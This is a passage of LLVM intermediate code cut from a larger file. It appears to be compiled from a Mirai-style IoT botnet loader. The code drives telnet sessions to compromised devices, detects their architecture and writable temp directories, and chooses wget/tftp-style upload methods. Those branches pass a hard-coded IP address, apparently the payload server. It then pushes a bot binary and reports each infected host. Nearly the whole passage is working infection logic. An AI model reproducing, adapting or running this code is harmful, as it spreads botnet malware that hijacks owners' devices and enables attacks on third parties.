  %748 = call i32 (i32, i8*, ...) @fdsend(i32 %747, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i32 0, i32 0))
  %749 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %750 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %749, i32 0, i32 2
  %751 = load i32, i32* %750, align 8
  %752 = call i8* @table_retrieve_val(i32 11, i32* null)
  %753 = call i32 (i32, i8*, ...) @fdsend(i32 %751, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0), i8* %752)
  call void @table_lock_val(i8 zeroext 11)
  %754 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %755 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %754, i32 0, i32 16
  store i32 6, i32* %755, align 8
  br label %778

; <label>:756:                                    ; preds = %740
  %757 = load i32, i32* %35, align 4
  %758 = icmp eq i32 %757, -1
  br i1 %758, label %759, label %777

; <label>:759:                                    ; preds = %756
  %760 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %761 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %760, i32 0, i32 2
  %762 = load i32, i32* %761, align 8
  %763 = call i32 @close(i32 %762)
  %764 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %765 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %764, i32 0, i32 2
  store i32 -1, i32* %765, align 8
  %766 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %766, i32 0, i32 9
  %768 = load i8, i8* %767, align 4
  %769 = add i8 %768, 1
  store i8 %769, i8* %767, align 4
  %770 = zext i8 %769 to i32
  %771 = icmp eq i32 %770, 10
  br i1 %771, label %772, label %774

; <label>:772:                                    ; preds = %759
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %773, i32 1)
  br label %776

; <label>:774:                                    ; preds = %759
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %775)
  br label %776

; <label>:776:                                    ; preds = %774, %772
  br label %777

; <label>:777:                                    ; preds = %776, %756
  br label %778

; <label>:778:                                    ; preds = %777, %744
  br label %1105

; <label>:779:                                    ; preds = %694
  %780 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %781 = call i32 @consume_resp_prompt(%struct.scanner_connection* %780)
  store i32 %781, i32* %35, align 4
  %782 = icmp sgt i32 %781, 0
  br i1 %782, label %783, label %827

; <label>:783:                                    ; preds = %779
  %784 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %785 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %784, i32 0, i32 5
  store i32 0, i32* %785, align 4
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %787 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %786, i32 0, i32 1
  %788 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 8
  %790 = icmp ne i32 %789, 0
  br i1 %790, label %798, label %791

; <label>:791:                                    ; preds = %783
  %792 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %793 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %792, i32 0, i32 2
  %794 = load i32, i32* %793, align 8
  %795 = call i32 (i32, i8*, ...) @fdsend(i32 %794, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i32 0, i32 0))
  %796 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %797 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %796, i32 0, i32 16
  store i32 7, i32* %797, align 8
  br label %826

; <label>:798:                                    ; preds = %783
  %799 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %800 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %799, i32 0, i32 8
  %801 = getelementptr inbounds [16 x i8], [16 x i8]* %800, i32 0, i32 0
  %802 = call i32 @strcmp(i8* %801, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %803 = icmp ne i32 %802, 0
  br i1 %803, label %804, label %810

; <label>:804:                                    ; preds = %798
  %805 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %806 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %805, i32 0, i32 8
  %807 = getelementptr inbounds [16 x i8], [16 x i8]* %806, i32 0, i32 0
  %808 = call i32 @strcmp(i8* %807, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #10
  %809 = icmp ne i32 %808, 0
  br i1 %809, label %818, label %810

; <label>:810:                                    ; preds = %804, %798
  call void @table_unlock_val(i8 zeroext 11)
  %811 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %812 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %811, i32 0, i32 2
  %813 = load i32, i32* %812, align 8
  %814 = call i8* @table_retrieve_val(i32 11, i32* null)
  %815 = call i32 (i32, i8*, ...) @fdsend(i32 %813, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i32 0, i32 0), i8* %814)
  call void @table_lock_val(i8 zeroext 11)
  %816 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %817 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %816, i32 0, i32 16
  store i32 8, i32* %817, align 8
  br label %1105

; <label>:818:                                    ; preds = %804
  call void @table_unlock_val(i8 zeroext 11)
  %819 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %820 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %819, i32 0, i32 2
  %821 = load i32, i32* %820, align 8
  %822 = call i8* @table_retrieve_val(i32 11, i32* null)
  %823 = call i32 (i32, i8*, ...) @fdsend(i32 %821, i8* %822)
  call void @table_lock_val(i8 zeroext 11)
  %824 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %825 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %824, i32 0, i32 16
  store i32 9, i32* %825, align 8
  br label %826

; <label>:826:                                    ; preds = %818, %791
  br label %827

; <label>:827:                                    ; preds = %826, %779
  br label %1105

; <label>:828:                                    ; preds = %694
  %829 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %830 = call i32 @parse_elf_response(%struct.scanner_connection* %829)
  store i32 %830, i32* %35, align 4
  %831 = icmp sgt i32 %830, 0
  br i1 %831, label %832, label %837

; <label>:832:                                    ; preds = %828
  %833 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %834 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %833, i32 0, i32 1
  %835 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %834, i32 0, i32 0
  store i32 1, i32* %835, align 8
  %836 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %836)
  br label %845

; <label>:837:                                    ; preds = %828
  %838 = load i32, i32* %35, align 4
  %839 = icmp eq i32 %838, -1
  br i1 %839, label %840, label %844

; <label>:840:                                    ; preds = %837
  %841 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %842 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %841, i32 0, i32 9
  store i8 0, i8* %842, align 4
  %843 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %843, i32 1)
  br label %844

; <label>:844:                                    ; preds = %840, %837
  br label %845

; <label>:845:                                    ; preds = %844, %832
  br label %1105

; <label>:846:                                    ; preds = %694
  %847 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %848 = call i32 @consume_arm_subtype(%struct.scanner_connection* %847)
  store i32 %848, i32* %35, align 4
  %849 = icmp sgt i32 %848, 0
  br i1 %849, label %850, label %858

; <label>:850:                                    ; preds = %846
  call void @table_unlock_val(i8 zeroext 11)
  %851 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %852 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %851, i32 0, i32 2
  %853 = load i32, i32* %852, align 8
  %854 = call i8* @table_retrieve_val(i32 11, i32* null)
  %855 = call i32 (i32, i8*, ...) @fdsend(i32 %853, i8* %854)
  call void @table_lock_val(i8 zeroext 11)
  %856 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %857 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %856, i32 0, i32 16
  store i32 9, i32* %857, align 8
  br label %858

; <label>:858:                                    ; preds = %850, %846
  br label %1105

; <label>:859:                                    ; preds = %694
  %860 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %861 = call i32 @consume_resp_prompt(%struct.scanner_connection* %860)
  store i32 %861, i32* %35, align 4
  %862 = icmp sgt i32 %861, 0
  br i1 %862, label %863, label %903

; <label>:863:                                    ; preds = %859
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 15
  %866 = load i32, i32* %865, align 4
  %867 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %868 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %867, i32 0, i32 13
  %869 = load i16, i16* %868, align 8
  %870 = zext i16 %869 to i32
  %871 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %866, i32 %870, %struct.scanner_connection* %871, i32 0)
  store i32 0, i32* %36, align 4
  br label %872

; <label>:872:                                    ; preds = %888, %863
  %873 = load i32, i32* %36, align 4
  %874 = icmp slt i32 %873, 15
  br i1 %874, label %875, label %891

; <label>:875:                                    ; preds = %872
  %876 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %877 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %876, i32 0, i32 2
  %878 = load i32, i32* %877, align 8
  %879 = load i32, i32* %36, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %880
  %882 = load i8*, i8** %881, align 8
  %883 = load i32, i32* %36, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %884
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 (i32, i8*, ...) @fdsend(i32 %878, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i32 0, i32 0), i8* %882, i8* %886)
  br label %888

; <label>:888:                                    ; preds = %875
  %889 = load i32, i32* %36, align 4
  %890 = add nsw i32 %889, 1
  store i32 %890, i32* %36, align 4
  br label %872

; <label>:891:                                    ; preds = %872
  %892 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %892, i32 0, i32 2
  %894 = load i32, i32* %893, align 8
  %895 = call i32 (i32, i8*, ...) @fdsend(i32 %894, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 11)
  %896 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %896, i32 0, i32 2
  %898 = load i32, i32* %897, align 8
  %899 = call i8* @table_retrieve_val(i32 11, i32* null)
  %900 = call i32 (i32, i8*, ...) @fdsend(i32 %898, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i32 0, i32 0), i8* %899)
  call void @table_lock_val(i8 zeroext 11)
  %901 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %902 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %901, i32 0, i32 16
  store i32 10, i32* %902, align 8
  br label %903

; <label>:903:                                    ; preds = %891, %859
  br label %1105

; <label>:904:                                    ; preds = %694
  %905 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %906 = call i32 @consume_resp_prompt(%struct.scanner_connection* %905)
  store i32 %906, i32* %35, align 4
  %907 = icmp sgt i32 %906, 0
  br i1 %907, label %908, label %933

; <label>:908:                                    ; preds = %904
  %909 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %910 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %909, i32 0, i32 8
  %911 = getelementptr inbounds [16 x i8], [16 x i8]* %910, i32 0, i32 0
  %912 = call i32 @strcmp(i8* %911, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0)) #10
  %913 = icmp eq i32 %912, 0
  br i1 %913, label %914, label %925

; <label>:914:                                    ; preds = %908
  call void @table_unlock_val(i8 zeroext 11)
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %915, i32 0, i32 2
  %917 = load i32, i32* %916, align 8
  %918 = call i8* @table_retrieve_val(i32 11, i32* null)
  %919 = call i32 (i32, i8*, ...) @fdsend(i32 %917, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %918)
  call void @table_lock_val(i8 zeroext 11)
  %920 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %921 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %920, i32 0, i32 1
  %922 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %921, i32 0, i32 1
  store i32 3, i32* %922, align 4
  %923 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %924 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %923, i32 0, i32 16
  store i32 13, i32* %924, align 8
  br label %1105

; <label>:925:                                    ; preds = %908
  call void @table_unlock_val(i8 zeroext 11)
  %926 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %927 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %926, i32 0, i32 2
  %928 = load i32, i32* %927, align 8
  %929 = call i8* @table_retrieve_val(i32 11, i32* null)
  %930 = call i32 (i32, i8*, ...) @fdsend(i32 %928, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i32 0, i32 0), i8* %929)
  call void @table_lock_val(i8 zeroext 11)
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 16
  store i32 12, i32* %932, align 8
  br label %933

; <label>:933:                                    ; preds = %925, %904
  br label %1105

; <label>:934:                                    ; preds = %694
  %935 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %936 = call i32 @connection_consume_upload_methods(%struct.scanner_connection* %935)
  store i32 %936, i32* %35, align 4
  %937 = load i32, i32* %35, align 4
  %938 = icmp ne i32 %937, 0
  br i1 %938, label %939, label %981

; <label>:939:                                    ; preds = %934
  call void @table_unlock_val(i8 zeroext 11)
  %940 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %941 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %940, i32 0, i32 1
  %942 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %941, i32 0, i32 1
  %943 = load i32, i32* %942, align 4
  switch i32 %943, label %968 [
    i32 0, label %944
    i32 1, label %950
    i32 2, label %959
  ]

; <label>:944:                                    ; preds = %939
  %945 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %946 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %945, i32 0, i32 2
  %947 = load i32, i32* %946, align 8
  %948 = call i8* @table_retrieve_val(i32 11, i32* null)
  %949 = call i32 (i32, i8*, ...) @fdsend(i32 %947, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i32 0, i32 0), i8* %948)
  br label %968

; <label>:950:                                    ; preds = %939
  %951 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %952 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %951, i32 0, i32 2
  %953 = load i32, i32* %952, align 8
  %954 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %955 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %954, i32 0, i32 8
  %956 = getelementptr inbounds [16 x i8], [16 x i8]* %955, i32 0, i32 0
  %957 = call i8* @table_retrieve_val(i32 11, i32* null)
  %958 = call i32 (i32, i8*, ...) @fdsend(i32 %953, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i8* %956, i8* %957)
  br label %968

; <label>:959:                                    ; preds = %939
  %960 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %961 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %960, i32 0, i32 2
  %962 = load i32, i32* %961, align 8
  %963 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %964 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %963, i32 0, i32 8
  %965 = getelementptr inbounds [16 x i8], [16 x i8]* %964, i32 0, i32 0
  %966 = call i8* @table_retrieve_val(i32 11, i32* null)
  %967 = call i32 (i32, i8*, ...) @fdsend(i32 %962, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i32 0, i32 0), i8* %965, i32 176, i32 107, i32 133, i32 208, i8* %966)
  br label %968

; <label>:968:                                    ; preds = %959, %950, %944, %939
  call void @table_lock_val(i8 zeroext 11)
  %969 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %970 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %969, i32 0, i32 1
  %971 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %970, i32 0, i32 1
  %972 = load i32, i32* %971, align 4
  %973 = icmp ne i32 %972, 0
  br i1 %973, label %974, label %977

; <label>:974:                                    ; preds = %968
  %975 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %976 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %975, i32 0, i32 16
  store i32 13, i32* %976, align 8
  br label %980

; <label>:977:                                    ; preds = %968
  %978 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %979 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %978, i32 0, i32 16
  store i32 11, i32* %979, align 8
  br label %980

; <label>:980:                                    ; preds = %977, %974
  br label %981

; <label>:981:                                    ; preds = %980, %934
  br label %1105

; <label>:982:                                    ; preds = %694
  %983 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %984 = call i32 @consume_resp_prompt(%struct.scanner_connection* %983)
  store i32 %984, i32* %35, align 4
  %985 = icmp sgt i32 %984, 0
  br i1 %985, label %986, label %1054

; <label>:986:                                    ; preds = %982
  %987 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %988 = call %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %987)
  store %struct.payload* %988, %struct.payload** %6, align 8
  %989 = load %struct.payload*, %struct.payload** %6, align 8
  %990 = icmp ne %struct.payload* %989, null
  br i1 %990, label %993, label %991

; <label>:991:                                    ; preds = %986
  %992 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %992, i32 1)
  br label %1105

; <label>:993:                                    ; preds = %986
  %994 = load %struct.payload*, %struct.payload** %6, align 8
  %995 = call %struct.binary* @process_retrieve_binary(%struct.payload* %994)
  store %struct.binary* %995, %struct.binary** %7, align 8
  %996 = load %struct.binary*, %struct.binary** %7, align 8
  %997 = icmp ne %struct.binary* %996, null
  br i1 %997, label %1000, label %998

; <label>:998:                                    ; preds = %993
  %999 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %999, i32 1)
  br label %1105

; <label>:1000:                                   ; preds = %993
  call void @table_unlock_val(i8 zeroext 11)
  %1001 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1002 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1001, i32 0, i32 2
  %1003 = load i32, i32* %1002, align 8
  %1004 = load %struct.binary*, %struct.binary** %7, align 8
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1006 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1005, i32 0, i32 12
  %1007 = load i8, i8* %1006, align 1
  %1008 = zext i8 %1007 to i64
  %1009 = getelementptr inbounds %struct.binary, %struct.binary* %1004, i64 %1008
  %1010 = getelementptr inbounds %struct.binary, %struct.binary* %1009, i32 0, i32 0
  %1011 = load i8*, i8** %1010, align 8
  %1012 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1013 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1012, i32 0, i32 12
  %1014 = load i8, i8* %1013, align 1
  %1015 = zext i8 %1014 to i32
  %1016 = icmp eq i32 %1015, 0
  %1017 = select i1 %1016, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0)
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1019 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1018, i32 0, i32 12
  %1020 = load i8, i8* %1019, align 1
  %1021 = zext i8 %1020 to i32
  %1022 = load %struct.binary*, %struct.binary** %7, align 8
  %1023 = getelementptr inbounds %struct.binary, %struct.binary* %1022, i32 0, i32 1
  %1024 = load i8, i8* %1023, align 8
  %1025 = zext i8 %1024 to i32
  %1026 = sub nsw i32 %1025, 1
  %1027 = icmp sge i32 %1021, %1026
  %1028 = select i1 %1027, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i32 0, i32 0)
  %1029 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1030 = call i32 (i32, i8*, ...) @fdsend(i32 %1003, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i32 0, i32 0), i8* %1011, i8* %1017, i8* %1028, i8* %1029)
  call void @table_lock_val(i8 zeroext 11)
  %1031 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1032 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1031, i32 0, i32 12
  %1033 = load i8, i8* %1032, align 1
  %1034 = zext i8 %1033 to i32
  %1035 = load %struct.binary*, %struct.binary** %7, align 8
  %1036 = getelementptr inbounds %struct.binary, %struct.binary* %1035, i32 0, i32 1
  %1037 = load i8, i8* %1036, align 8
  %1038 = zext i8 %1037 to i32
  %1039 = icmp slt i32 %1034, %1038
  br i1 %1039, label %1040, label %1049

; <label>:1040:                                   ; preds = %1000
  %1041 = load %struct.binary*, %struct.binary** %7, align 8
  %1042 = bitcast %struct.binary* %1041 to i8*
  call void @free(i8* %1042) #7
  %1043 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1043, i32 0, i32 12
  %1045 = load i8, i8* %1044, align 1
  %1046 = add i8 %1045, 1
  store i8 %1046, i8* %1044, align 1
  %1047 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1048 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1047, i32 0, i32 16
  store i32 11, i32* %1048, align 8
  br label %1105

; <label>:1049:                                   ; preds = %1000
  %1050 = load %struct.binary*, %struct.binary** %7, align 8
  %1051 = bitcast %struct.binary* %1050 to i8*
  call void @free(i8* %1051) #7
  %1052 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1053 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1052, i32 0, i32 16
  store i32 13, i32* %1053, align 8
  br label %1054

; <label>:1054:                                   ; preds = %1049, %982
  br label %1105

; <label>:1055:                                   ; preds = %694
  %1056 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1057 = call i32 @consume_method_resonse(%struct.scanner_connection* %1056)
  store i32 %1057, i32* %35, align 4
  %1058 = icmp sgt i32 %1057, 0
  br i1 %1058, label %1059, label %1069

; <label>:1059:                                   ; preds = %1055
  %1060 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1061 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1060, i32 0, i32 15
  %1062 = load i32, i32* %1061, align 4
  %1063 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1064 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1063, i32 0, i32 13
  %1065 = load i16, i16* %1064, align 8
  %1066 = zext i16 %1065 to i32
  %1067 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1062, i32 %1066, %struct.scanner_connection* %1067, i32 1)
  %1068 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1068, i32 1)
  br label %1103

; <label>:1069:                                   ; preds = %1055
  %1070 = load i32, i32* %35, align 4
  %1071 = icmp eq i32 %1070, -1
  br i1 %1071, label %1072, label %1096

; <label>:1072:                                   ; preds = %1069
  %1073 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1074 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1073, i32 0, i32 16
  %1075 = load i32, i32* %1074, align 8
  %1076 = icmp eq i32 %1075, 11
  br i1 %1076, label %1083, label %1077

; <label>:1077:                                   ; preds = %1072
  %1078 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1079 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1078, i32 0, i32 1
  %1080 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1079, i32 0, i32 1
  %1081 = load i32, i32* %1080, align 4
  %1082 = icmp eq i32 %1081, 0
  br i1 %1082, label %1083, label %1085

; <label>:1083:                                   ; preds = %1077, %1072
  %1084 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1084, i32 1)
  br label %1105

; <label>:1085:                                   ; preds = %1077
  %1086 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1087 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1086, i32 0, i32 1
  %1088 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1087, i32 0, i32 1
  store i32 0, i32* %1088, align 4
  %1089 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1090 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1089, i32 0, i32 16
  store i32 11, i32* %1090, align 8
  call void @table_unlock_val(i8 zeroext 11)
  %1091 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1092 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1091, i32 0, i32 2
  %1093 = load i32, i32* %1092, align 8
  %1094 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1095 = call i32 (i32, i8*, ...) @fdsend(i32 %1093, i8* %1094)
  call void @table_lock_val(i8 zeroext 11)
  br label %1105

; <label>:1096:                                   ; preds = %1069
  %1097 = load i32, i32* %35, align 4
  %1098 = icmp eq i32 %1097, -2
  br i1 %1098, label %1099, label %1101

; <label>:1099:                                   ; preds = %1096
  %1100 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1100, i32 1)
  br label %1105

; <label>:1101:                                   ; preds = %1096
  br label %1102

; <label>:1102:                                   ; preds = %1101
  br label %1103

; <label>:1103:                                   ; preds = %1102, %1059
  br label %1105

; <label>:1104:                                   ; preds = %694
  store i32 0, i32* %35, align 4
  br label %1105

; <label>:1105:                                   ; preds = %1104, %1103, %1099, %1085, %1083, %1054, %1040, %998, %991, %981, %933, %914, %903, %858, %845, %827, %810, %778, %739, %722, %705
  %1106 = load i32, i32* %35, align 4
  %1107 = icmp eq i32 %1106, 0
  br i1 %1107, label %1108, label %1109

; <label>:1108:                                   ; preds = %1105
  br label %1146

; <label>:1109:                                   ; preds = %1105
  %1110 = load i32, i32* %35, align 4
  %1111 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1111, i32 0, i32 4
  %1113 = load i32, i32* %1112, align 8
  %1114 = icmp sgt i32 %1110, %1113
  br i1 %1114, label %1115, label %1119

; <label>:1115:                                   ; preds = %1109
  %1116 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1116, i32 0, i32 4
  %1118 = load i32, i32* %1117, align 8
  store i32 %1118, i32* %35, align 4
  br label %1119

; <label>:1119:                                   ; preds = %1115, %1109
  %1120 = load i32, i32* %35, align 4
  %1121 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1122 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1121, i32 0, i32 4
  %1123 = load i32, i32* %1122, align 8
  %1124 = sub nsw i32 %1123, %1120
  store i32 %1124, i32* %1122, align 8
